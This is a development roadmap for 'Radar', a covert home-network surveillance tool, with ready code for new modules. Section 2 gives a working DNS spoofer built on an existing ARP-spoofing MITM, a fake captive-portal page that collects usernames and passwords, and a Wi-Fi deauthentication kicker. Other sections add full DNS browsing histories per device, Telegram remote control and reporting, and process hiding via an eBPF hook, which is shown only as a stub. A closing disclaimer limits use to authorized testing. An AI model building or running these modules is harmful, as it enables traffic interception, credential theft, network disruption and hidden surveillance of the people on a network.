# 🚀 Radar: Comprehensive Improvement & Tactical Development Roadmap

This document is the official engineering blueprint for evolving Project Radar from a monitoring tool into a full-spectrum stealth intelligence and network control platform. Every section includes exact file paths, existing code hooks, the new modules to build, and code examples tied directly to the current Radar architecture.

---

## 📐 Current Architecture Overview

Before adding anything new, here is a map of what already exists:

```
radar/
├── main.py                  → RadarDaemon (orchestrator, runs all threads)
├── config.py                → Settings model (YAML + ENV loader)
├── database/
│   ├── vault.py             → SQLite database (all reads/writes go here)
│   ├── models.py            → Pydantic data models (AppActivity, NetworkDevice, etc.)
│   ├── migrations.py        → Schema creator (creates all tables)
│   └── cleanup.py           → Purges old data nightly
├── fingerprint/
│   ├── scanner.py           → ArpScanner (ARP sweep every ~3 mins)
│   ├── passive.py           → PassiveSentinel (mDNS + SSDP listeners)
│   ├── traffic.py           → TrafficSentinel (DPI + DNS sniffer — already very powerful)
│   ├── profiler.py          → DeviceProfiler (hostname + OUI resolution)
│   ├── tactical.py          → ArpRedirector (MITM / ARP Spoofing)
│   └── exporter.py          → Data exporter module
├── monitors/
│   ├── app_monitor.py       → AppMonitor (X11 active window sampler)
│   ├── system_monitor.py    → SystemMonitor (CPU/RAM/Battery/WiFi via psutil)
│   ├── terminal_monitor.py  → Watchdog for shell history files
│   └── idle_detector.py     → xprintidle wrapper
├── reports/
│   ├── engine.py            → ReportingEngine (scheduler + delivery)
│   ├── aggregator.py        → DataAggregator (daily summaries)
│   ├── generator.py         → PDF report builder (FPDF2 + Matplotlib)
│   └── mailer.py            → SMTP email delivery (Gmail)
├── web/
│   ├── app.py               → FastAPI server (REST API + Static serving)
│   └── static/              → Frontend HTML + JS + CSS dashboard
└── utils/
    ├── stealth.py           → Process name obfuscation + low priority
    ├── helpers.py           → Network helpers (subnet, interface detection)
    └── dashboard.py         → Legacy terminal UI
```

---

## 1. 🕵️ Deeper Network Intelligence

### 1.1 Passive OS Fingerprinting (TCP/IP Stack Analysis)

**Why it matters:** The `TrafficSentinel` in `radar/fingerprint/traffic.py` already captures every packet. Right now, it only extracts DNS and SNI data. We can extend the `_process_packet()` method to also read **TCP header values** and guess the OS.

**The Science:**

| OS | TTL | TCP Window Size |
| :--- | :--- | :--- |
| Windows 10/11 | 128 | 65535 |
| Linux / Android | 64 | 29200 |
| macOS / iOS (iPhone) | 64 | 65535 |
| Windows XP (Legacy) | 128 | 16384 |

**Where to add it:** `radar/fingerprint/traffic.py` → inside `_process_packet()`

```python
# After DPI Log section in _process_packet():
# ── 5. Passive OS Fingerprinting ─────────────────────────────────────────────
if pkt.haslayer(TCP) and pkt[TCP].flags == 0x02:  # SYN packet only
    ttl = pkt[IP].ttl
    window = pkt[TCP].window
    os_guess = "Unknown OS"

    if ttl >= 100:  # Likely Windows (starts at 128)
        os_guess = "Windows"
    elif ttl >= 60:  # Likely Linux/Android/macOS (starts at 64)
        if window == 65535:
            os_guess = "macOS / iOS"
        else:
            os_guess = "Linux / Android"

    with self._lock:
        self.os_fingerprints[src_ip] = os_guess
```

**New model field needed in `radar/database/models.py`:**
```python
# Add to NetworkDeviceRecord:
os_guess: Optional[str] = None  # Passive OS fingerprint
```

---

### 1.2 Full Passive DNS Logger (All Domains, All Devices)

**Current state:** `TrafficSentinel` in `traffic.py` already listens to DNS (Port 53) and calls `_classify_domain()`. However, it only stores the "friendly activity label" (e.g., "Watching Netflix").

**The upgrade:** Store **every raw domain** requested by every device in a new database table called `dns_log`. This builds a complete browsing history for every device on the network.

**New table to add in `radar/database/migrations.py`:**
```sql
CREATE TABLE IF NOT EXISTS dns_log (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp  DATETIME DEFAULT (datetime('now')),
    src_ip     TEXT NOT NULL,
    domain     TEXT NOT NULL,
    query_type TEXT DEFAULT 'A'
);
```

**New vault method to add in `radar/database/vault.py`:**
```python
def insert_dns_log(self, src_ip: str, domain: str):
    self._execute(
        "INSERT INTO dns_log (src_ip, domain) VALUES (?, ?)",
        (src_ip, domain)
    )
```

**New dashboard API in `radar/web/app.py`:**
```python
@app.get("/api/device/{mac}/dns-history")
async def get_dns_history(mac: str):
    """Returns the full DNS history for a device."""
    devices = vault.get_network_devices()
    device = next((d for d in devices if d.mac_address == mac), None)
    if not device: raise HTTPException(404)
    rows = vault.get_dns_log(device.ip_address)
    return rows
```

---

### 1.3 NetBIOS Name Querying (Windows PC Discovery)

**What it does:** Queries devices directly for their Windows computer name (e.g., "AHMED-GAMING-PC").

**Where to add it:** `radar/fingerprint/scanner.py` → inside the `scan()` method, after ARP scan.

```python
import socket

def _get_netbios_name(self, ip: str) -> Optional[str]:
    """Sends a NetBIOS Name Service query to get the Windows computer name."""
    try:
        payload = b'\xff\xfe' + b'\x00' * 14 + b'\x00\x01' + b'\x00' * 4
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1.0)
        sock.sendto(payload, (ip, 137))
        data, _ = sock.recvfrom(1024)
        if len(data) > 57:
            name = data[57:72].decode('ascii', errors='ignore').strip()
            return name if name else None
    except Exception:
        return None
```

---

## 2. ⚔️ Offensive & LAN Manipulation Module

### 2.1 DNS Spoofer (`radar/fingerprint/dns_spoofer.py`) — NEW FILE

**Goal:** When a target device asks "Where is google.com?", intercept the answer and reply with your own IP address to redirect them anywhere.

**How it works with the existing `ArpRedirector`:**
1. First, run `make intercept IP=<target>` to position yourself as the Man-in-the-Middle.
2. Then, run the DNS Spoofer. It will now receive all DNS queries from the target.
3. It inspects the domain and replies with a fake IP.

**New file to create: `radar/fingerprint/dns_spoofer.py`**
```python
from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, send
import logging

logger = logging.getLogger(__name__)

SPOOF_RULES = {
    # "domain_keyword": "redirect_to_this_ip"
    # Example: redirect all facebook traffic to your machine
}

class DnsSpoofer:
    def __init__(self, target_ip: str, rules: dict, redirect_ip: str):
        self.target_ip = target_ip
        self.rules = rules
        self.redirect_ip = redirect_ip  # Your machine's IP

    def _process(self, pkt):
        if not (pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0):
            return
        if pkt[IP].src != self.target_ip:
            return

        query = pkt[DNSQR].qname.decode().rstrip('.').lower()

        # Check if this domain is in our spoof rules
        for keyword in self.rules:
            if keyword in query:
                spoof = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                        UDP(dport=pkt[UDP].sport, sport=53) / \
                        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                            an=DNSRR(rrname=pkt[DNSQR].qname, rdata=self.redirect_ip))
                send(spoof, verbose=False)
                logger.info(f"[SPOOF] Redirected {query} → {self.redirect_ip} for {self.target_ip}")
                return

    def start(self):
        logger.info(f"DNS Spoofer active for target {self.target_ip}")
        sniff(filter=f"udp port 53 and host {self.target_ip}",
              prn=self._process, store=0)
```

**Makefile command to add:**
```makefile
spoof: ## Start DNS Spoofer (usage: make spoof IP=192.168.1.5 DOMAIN=facebook.com)
    @sudo PYTHONPATH=. $(PYTHON) -m radar.fingerprint.dns_spoofer $(IP) $(DOMAIN)
```

---

### 2.2 Captive Portal Trigger (`radar/fingerprint/portal.py`) — NEW FILE

**Goal:** Force a phone's browser to automatically open and show a page you control.

**How it works:**
1. You run `make intercept IP=<phone>` to MITM the phone.
2. You run `make portal` to start a tiny fake web server.
3. The DNS Spoofer redirects `captive.apple.com` (iOS) or `connectivitycheck.gstatic.com` (Android) to your machine.
4. The phone detects that the response is not what it expected and auto-pops up the browser.

**New file: `radar/fingerprint/portal.py`**
```python
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn

PORTAL_HTML = """
<!DOCTYPE html>
<html>
<head><title>Network Login Required</title></head>
<body style="font-family: Arial; text-align: center; padding-top: 50px;">
    <h1>⚠️ Network Authentication Required</h1>
    <p>Please sign in to access the Internet.</p>
    <form method="POST" action="/submit">
        <input type="text" name="username" placeholder="Username" /><br><br>
        <input type="password" name="password" placeholder="Password" /><br><br>
        <button type="submit">Connect</button>
    </form>
</body>
</html>
"""

portal_app = FastAPI()

@portal_app.get("/{path:path}", response_class=HTMLResponse)
async def serve_portal(path: str):
    return PORTAL_HTML

def start_portal(port: int = 8080):
    """Starts the captive portal server on port 80."""
    uvicorn.run(portal_app, host="0.0.0.0", port=port)
```

**Makefile command to add:**
```makefile
portal: ## Start the Captive Portal server
    @sudo PYTHONPATH=. $(PYTHON) -m radar.fingerprint.portal
```

---

### 2.3 Wi-Fi Deauthentication Kicker (`radar/fingerprint/deauth.py`) — NEW FILE

**What it does:** Kicks a device off the Wi-Fi by sending forged 802.11 "Deauthentication" frames.

**Requirement:** You need a Wi-Fi adapter that supports **Monitor Mode**.

**How to check if your card supports it:**
```bash
iw list | grep "Supported interface modes" -A 10
# Look for: * monitor
```

**How to enable Monitor Mode:**
```bash
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
```

**New file: `radar/fingerprint/deauth.py`**
```python
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import threading, time, logging

logger = logging.getLogger(__name__)

class WifiKicker:
    """Sends 802.11 Deauth frames to disconnect a target device."""

    def __init__(self, target_mac: str, bssid: str, interface: str = "wlan0mon"):
        self.target_mac = target_mac
        self.bssid = bssid       # Your router's MAC address
        self.interface = interface
        self.running = False

    def _kick_loop(self, count: int = 100):
        """Sends deauth frames in a loop."""
        # Frame 1: Tell the device the AP kicked it
        pkt_to_client = RadioTap() / \
            Dot11(addr1=self.target_mac, addr2=self.bssid, addr3=self.bssid) / \
            Dot11Deauth(reason=7)
        # Frame 2: Tell the AP the device left
        pkt_to_ap = RadioTap() / \
            Dot11(addr1=self.bssid, addr2=self.target_mac, addr3=self.bssid) / \
            Dot11Deauth(reason=7)

        logger.info(f"Kicking {self.target_mac} from {self.bssid}...")
        sendp([pkt_to_client, pkt_to_ap], iface=self.interface,
              count=count, inter=0.1, verbose=False)

    def kick(self, count: int = 100):
        self._kick_loop(count)

    def start_continuous(self):
        self.running = True
        while self.running:
            self._kick_loop(count=10)
            time.sleep(0.5)

    def stop(self):
        self.running = False
```

**Makefile command to add:**
```makefile
kick: ## Kick a device off Wi-Fi (usage: make kick MAC=XX:XX:XX:XX:XX:XX BSSID=YY:YY:YY:YY:YY:YY)
    @sudo PYTHONPATH=. $(PYTHON) -m radar.fingerprint.deauth $(MAC) $(BSSID)
```

---

## 3. 🥷 Advanced Stealth & Evasion

### 3.1 Remote C2 via Telegram Bot (`radar/utils/telegram_bot.py`) — NEW FILE

**Goal:** Control Radar from anywhere in the world by texting a Telegram bot.

**Setup (One-time):**
1. Text `@BotFather` on Telegram and type `/newbot`.
2. Get your `TELEGRAM_BOT_TOKEN`.
3. Add to your `.env` file:
   ```
   TELEGRAM_BOT_TOKEN=your_token_here
   TELEGRAM_CHAT_ID=your_chat_id_here
   ```

**New field in `radar/config.py`:**
```python
class TelegramConfig(BaseModel):
    enabled: bool = False
    bot_token: str = ""
    chat_id: str = ""

# Add to Settings class:
telegram: TelegramConfig = Field(default_factory=TelegramConfig)
```

**New file: `radar/utils/telegram_bot.py`**
```python
import requests
import logging
from radar.config import settings

logger = logging.getLogger(__name__)

class TelegramReporter:
    """Sends alerts and reports via Telegram Bot."""

    BASE_URL = "https://api.telegram.org/bot"

    def __init__(self):
        self.token = settings.telegram.bot_token
        self.chat_id = settings.telegram.chat_id

    def send_message(self, text: str):
        """Sends a plain text message."""
        if not self.token or not self.chat_id:
            return
        try:
            url = f"{self.BASE_URL}{self.token}/sendMessage"
            requests.post(url, json={"chat_id": self.chat_id, "text": text}, timeout=5)
        except Exception as e:
            logger.error(f"Telegram send failed: {e}")

    def send_pdf(self, pdf_path: str, caption: str = "Daily Intel Report"):
        """Sends a PDF file as a Telegram document."""
        if not self.token or not self.chat_id:
            return
        try:
            url = f"{self.BASE_URL}{self.token}/sendDocument"
            with open(pdf_path, 'rb') as f:
                requests.post(url, data={"chat_id": self.chat_id, "caption": caption},
                              files={"document": f}, timeout=30)
        except Exception as e:
            logger.error(f"Telegram PDF send failed: {e}")

    def alert_new_device(self, device_name: str, ip: str, mac: str):
        msg = (
            f"🚨 NEW DEVICE DETECTED\n"
            f"Name: {device_name}\n"
            f"IP: {ip}\n"
            f"MAC: {mac}"
        )
        self.send_message(msg)
```

**Integration in `radar/fingerprint/scanner.py`:** After `vault.upsert_network_device()`, add:
```python
from radar.utils.telegram_bot import TelegramReporter
telegram = TelegramReporter()
# ... after device is found for the first time:
telegram.alert_new_device(record.device_name, record.ip_address, record.mac_address)
```

---

### 3.2 eBPF Process Hiding (Advanced)

> ⚠️ This is a very advanced Linux kernel technique. It requires Python's `bcc` library and a modern Linux kernel (5.x+).

**Goal:** Make Radar's process ID disappear from `ps`, `top`, and `htop` entirely.

**Concept:** Attach an eBPF hook to the `getdents64()` system call, which is what all directory listing tools (`/proc/`) use. When the hook sees Radar's PID in the list, it silently skips it before returning the result to the caller.

**New file: `radar/utils/ebpf_hide.py`**
```python
# This requires `pip install bcc`
# and a Linux kernel with BPF support (most Ubuntu 20.04+ kernels have it)

BPF_PROGRAM = """
// (Simplified concept — full implementation requires kernel headers)
// Hooks getdents64 and filters out PID_TO_HIDE from directory listings.
"""

def install_hook(pid_to_hide: int):
    try:
        from bcc import BPF
        prog = BPF_PROGRAM.replace("PID_TO_HIDE", str(pid_to_hide))
        b = BPF(text=prog)
        b.attach_kprobe(event="sys_getdents64", fn_name="hide_pid")
        print(f"eBPF hook installed. PID {pid_to_hide} is now invisible.")
    except ImportError:
        print("bcc not installed. Run: sudo apt install python3-bpfcc")
    except Exception as e:
        print(f"eBPF hook failed: {e}")
```

---

## 4. 🌐 Dashboard & Real-Time Upgrades

### 4.1 Live WebSockets (`radar/web/app.py`)

**Current state:** The dashboard uses `setInterval()` in JavaScript to poll the REST API every 3–5 seconds.

**The upgrade:** Replace polling with a persistent WebSocket connection. The server pushes data to the browser the instant a new packet is captured.

**New WebSocket endpoint to add in `radar/web/app.py`:**
```python
from fastapi import WebSocket, WebSocketDisconnect
import asyncio, json

@app.websocket("/ws/live-feed")
async def live_feed(websocket: WebSocket):
    """Streams real-time DPI events to the dashboard."""
    await websocket.accept()
    try:
        while True:
            # Push latest data every second
            today = datetime.now().date().isoformat()
            devices = vault.get_network_devices()
            active = [d for d in devices if d.last_seen.date().isoformat() == today]
            payload = {
                "timestamp": datetime.now().isoformat(),
                "active_devices": len(active),
                "device_list": [
                    {"name": d.device_name, "ip": d.ip_address,
                     "activity": d.last_activity or "Idle"}
                    for d in active[:20]
                ]
            }
            await websocket.send_text(json.dumps(payload))
            await asyncio.sleep(1)
    except WebSocketDisconnect:
        pass
```

**Frontend JavaScript to add to the dashboard (`radar/web/static/js/main.js`):**
```javascript
const ws = new WebSocket(`ws://${window.location.host}/ws/live-feed`);
ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    updateDeviceList(data.device_list); // Function to update the DOM
};
```

---

### 4.2 Interactive Network Map with D3.js

**Goal:** Draw a real-time, interactive map of the network as a force-directed graph.

**What to add to the dashboard HTML (`radar/web/static/index.html`):**
```html
<!-- Import D3.js -->
<script src="https://d3js.org/d3.v7.min.js"></script>
<div id="network-map"></div>
<script>
// Fetch devices and draw graph
async function drawNetworkMap() {
    const res = await fetch('/api/devices');
    const devices = await res.json();

    const nodes = [{ id: "Router", type: "router" }, ...devices.map(d => ({
        id: d.mac_address,
        label: d.device_name || d.ip_address,
        type: d.device_type
    }))];
    const links = devices.map(d => ({ source: "Router", target: d.mac_address }));

    // D3 force simulation renders spider-web layout automatically
    const simulation = d3.forceSimulation(nodes)
        .force("link", d3.forceLink(links).id(d => d.id).distance(120))
        .force("charge", d3.forceManyBody().strength(-300))
        .force("center", d3.forceCenter(400, 300));
    // ... SVG rendering code
}
drawNetworkMap();
</script>
```

---

## 5. 🧠 Machine Learning & Behavioral Anomaly Detection

### 5.1 Behavior Profiling (Detecting Compromised Devices)

**Goal:** Learn each device's "normal" behavior and alert when something unusual happens.

**New file: `radar/utils/anomaly_detector.py`**
```python
from collections import defaultdict
from radar.database.vault import Vault
from radar.utils.telegram_bot import TelegramReporter

class AnomalyDetector:
    """
    Learns each device's normal hourly activity patterns and
    fires alerts when significant deviations are detected.
    """
    def __init__(self, vault: Vault):
        self.vault = vault
        self.baseline = defaultdict(lambda: defaultdict(float))  # mac → hour → avg_bytes
        self.telegram = TelegramReporter()

    def train(self):
        """Build baselines from historical data."""
        # Compute average bytes per hour per device from past 7 days
        pass  # Implementation uses vault.get_device_flows()

    def check(self):
        """Check current activity against baseline. Alert on anomalies."""
        # Compare live DPI traffic against trained baseline
        # If current_bytes > 3 * baseline_avg: alert!
        pass
```

---

## 6. 📈 Development Phases & Priority Order

| Phase | Feature | New File | Complexity |
| :--- | :--- | :--- | :--- |
| **1** | DNS Logger | `vault.py`, `migrations.py` | 🟢 Easy |
| **1** | OS Fingerprinting | `traffic.py` | 🟢 Easy |
| **2** | DNS Spoofer | `fingerprint/dns_spoofer.py` | 🟡 Medium |
| **2** | Captive Portal | `fingerprint/portal.py` | 🟡 Medium |
| **2** | Telegram Bot | `utils/telegram_bot.py` | 🟡 Medium |
| **3** | WebSocket Live Feed | `web/app.py` | 🟡 Medium |
| **3** | D3.js Network Map | `web/static/` | 🟡 Medium |
| **4** | Wi-Fi Deauth Kicker | `fingerprint/deauth.py` | 🔴 Hard |
| **4** | Anomaly Detection | `utils/anomaly_detector.py` | 🔴 Hard |
| **5** | eBPF Process Hiding | `utils/ebpf_hide.py` | 🔴 Very Hard |

---

## ⚠️ Legal & Ethical Notice

All features documented here are for **educational and authorized security research** purposes only. You must only use offensive features (DNS Spoofing, Deauth, Captive Portal) on networks you **own** or have **explicit written permission** to test. Unauthorized interception of network traffic is a criminal offense in most countries.
